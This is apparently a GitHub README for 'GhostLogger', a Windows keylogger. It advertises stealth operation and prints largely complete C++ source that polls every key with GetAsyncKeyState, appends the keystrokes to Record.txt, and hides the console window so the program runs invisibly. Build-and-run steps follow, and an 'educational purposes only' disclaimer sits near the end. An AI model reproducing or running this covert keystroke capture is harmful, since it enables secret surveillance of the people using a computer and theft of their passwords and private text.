<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

<div align="center">

# GhostLogger 👻🖥️

**Welcome to **GhostLogger**, a stealthy and efficient keylogging application for Windows! Designed for educational purposes and to demonstrate low-level Windows programming techniques, GhostLogger captures and records keystrokes in a hidden manner.**

</div>

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Features 🌟
- **Stealth Mode**: Runs invisibly in the background.
- **Comprehensive Key Logging**: Captures a wide range of keys, including alphabetic characters, numeric keys, function keys, control keys, and special characters.
- **Log File**: Records all keystrokes in `Record.txt`.

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Project Structure 📁
```
GhostLogger
├───.vscode
│   ├───c_cpp_properties.json
│   ├───settings.json
│   └───tasks.json
└───src
    ├───main.cpp
    └───Record.txt
```

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## How It Works 🛠️
The main functionality is encapsulated in `main.cpp`, which includes the following key components:
- **KeyLogger**: A function that captures keystrokes using `GetAsyncKeyState` and writes them to `Record.txt`.
- **hide_exe**: A function that hides the console window to ensure the program runs `invisibly`.

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

### Code Overview 👨‍💻
Here's a brief look at the core code in `main.cpp`:

```cpp
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

// Function prototypes
void KeyLogger(void);
void hide_exe();

// main function
int main(void)
{
    hide_exe();
    KeyLogger();
}

// function to capture the keystrokes
void KeyLogger(void)
{
    char character;

    while (true)
    {
        for (character = 8; character <= 222; character++)
        {
            if (GetAsyncKeyState(character) == -32767)
            {
                std::ofstream write("Record.txt", std::ios::app);
                if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                {
                    character += 32;
                    write << character;
                }
                else if (character > 64 && character < 91)
                {
                    write << character;
                }

                switch (character)
                {
                    case 39: // '
                        write << (GetAsyncKeyState(0x10) ? "\"" : "'");
                        break;
                    case 44: // ,
                        write << (GetAsyncKeyState(0x10) ? "<" : ",");
                        break;
                    // ... handle other cases ...
                    case VK_RETURN: // ENTER key
                        write << " <Enter> " << std::endl;
                        break;
                    case 32: // Space key
                        write << " ";
                        break;
                    // ... handle other cases ...
                }
            }
        }
    }
}

// function to hide the exe file.
void hide_exe()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
```

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Getting Started 🚀
To run GhostLogger on your machine, follow these steps for different operating systems:

### Windows
1. **Clone the Repository**:
   ```sh
   git clone https://github.com/B3TA-BLOCKER/GhostLogger.git
   ```

2. **Open and Edit the Code**:
   - Use any text editor of your choice (e.g., Notepad++, Sublime Text, Atom, or even Notepad).

3. **Compile and Run**:
   - Ensure you have a C++ compiler installed. You can use any of the following methods:

#### Using GCC (MinGW):

1. **Install MinGW**: Download and install MinGW from [MinGW website](http://www.mingw.org/).

2. **Compile the Code**:
   ```sh
   g++ src/main.cpp -o main
   ```

3. **Run the Program**:
   ```sh
   ./main
   ```

#### Using Visual Studio:

1. **Install Visual Studio**: Download and install Visual Studio from [Visual Studio website](https://visualstudio.microsoft.com/).

2. **Open the Project**:
   - Create a new project or open an existing one.
   - Add `main.cpp` to the project.

3. **Compile and Run**:
   - Use the build and run options within Visual Studio.

### macOS and Linux
**This project relies on `Windows-specific APIs` and functions, making it `incompatible` with macOS and Linux out of the box.** 
**As GhostLogger uses Windows-specific functions like `GetAsyncKeyState`, `AllocConsole`, and `FindWindowA`, it won't compile or run on macOS and Linux without significant modifications. The instructions above are for general C++ projects.**

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Usage ⚙️
- Once the program is running, it will operate in the background, logging all keystrokes to `Record.txt`.
- To stop the program, you will need to end the process through Task Manager or by terminating it via your development environment.

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Legal Disclaimer ⚖️
This project is intended for educational purposes only. Unauthorized use of keylogging software is illegal and unethical. Always ensure you have explicit permission before using this software on any device.

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## Connect with Me 🌐
I'm always looking to expand my professional network and explore new opportunities. Let's connect!
- [LinkedIn](https://www.linkedin.com/in/hassaan-ali-bukhari/)
- [Email](mailto:hassaanalibukhari@gmail.com)

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

## License 📜
This project is licensed under the Creative Commons Zero v1.0 Universal License. See the [LICENSE](LICENSE) file for details.

<br>

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

Made by [Hassaan Ali Bukhari](https://github.com/B3TA-BLOCKER)
<br>

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">

[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=DotGothic16&size=41&width=800&height=60&lines=Happy+coding!+🚀&center=true&vCenter=true)](https://git.io/typing-svg)
